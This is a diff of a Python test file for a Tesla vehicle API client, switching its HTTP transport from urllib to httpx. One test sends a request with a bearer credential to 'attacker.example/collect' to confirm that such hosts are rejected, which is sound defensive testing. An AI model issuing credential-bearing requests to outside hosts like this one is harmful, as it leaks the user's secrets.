@@ -10,6 +10,7 @@ from cryptography.exceptions import UnsupportedAlgorithm
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import ec
 from tesla_personal_platform.tesla_client import (
+    HttpxTransport,
     LocalCommandProxyTransport,
     PartnerRegistrar,
     TeslaAPIError,
@@ -19,7 +20,6 @@ from tesla_personal_platform.tesla_client import (
     TeslaOAuthClient,
     TeslaOAuthConfig,
     TeslaReauthorizationRequired,
-    UrllibTransport,
 )
 from tesla_personal_platform.tesla_client.transport import HttpResponse
 
@@ -350,7 +350,7 @@ def test_partner_registration_creates_missing_record_then_verifies() -> None:
 
 def test_production_transport_rejects_non_tesla_hosts_before_network() -> None:
     with pytest.raises(ValueError, match="approved Tesla HTTPS host"):
-        UrllibTransport().request(
+        HttpxTransport().request(
             "GET",
             "https://attacker.example/collect",
             headers={"Authorization": "Bearer credential"},
@@ -363,8 +363,7 @@ def test_local_command_proxy_transport_rejects_non_loopback_and_unapproved_reque
 
     transport = object.__new__(LocalCommandProxyTransport)
     object.__setattr__(transport, "_origin", "https://localhost:4443")
-    object.__setattr__(transport, "_timeout_seconds", 1.0)
-    object.__setattr__(transport, "_opener", None)
+    object.__setattr__(transport, "_client", None)
 
     with pytest.raises(ValueError, match="signed telemetry configuration only"):
         transport.request("GET", f"{NA_BASE}/api/1/vehicles/VIN1/vehicle_data")
